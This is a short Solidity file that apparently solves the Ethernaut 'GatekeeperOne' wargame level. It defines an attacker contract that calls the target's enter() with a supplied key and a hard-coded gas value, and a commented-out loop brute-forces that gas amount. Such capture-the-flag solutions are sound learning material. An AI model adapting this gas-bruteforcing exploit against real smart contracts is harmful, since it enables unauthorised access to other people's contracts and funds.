// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {console} from "@forge-std/console.sol";

import {GatekeeperOne} from "@main/13_GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    GatekeeperOne gatekeeperone;
    // uint256 i;

    constructor(address _gatekeeperone) {
        gatekeeperone = GatekeeperOne(_gatekeeperone);
    }

    function attack(bytes8 gateKey) public {

        // for (uint256 i = 0; i <= 8191; i++) {
        //     try gatekeeperone.enter{gas: i + 800000}(gateKey) {
        //         console.log("passed with gas ->", 800000 + i);
        //         break;
        //     } catch {}
        // }
        gatekeeperone.enter{gas: 802986}(gateKey);
    }

}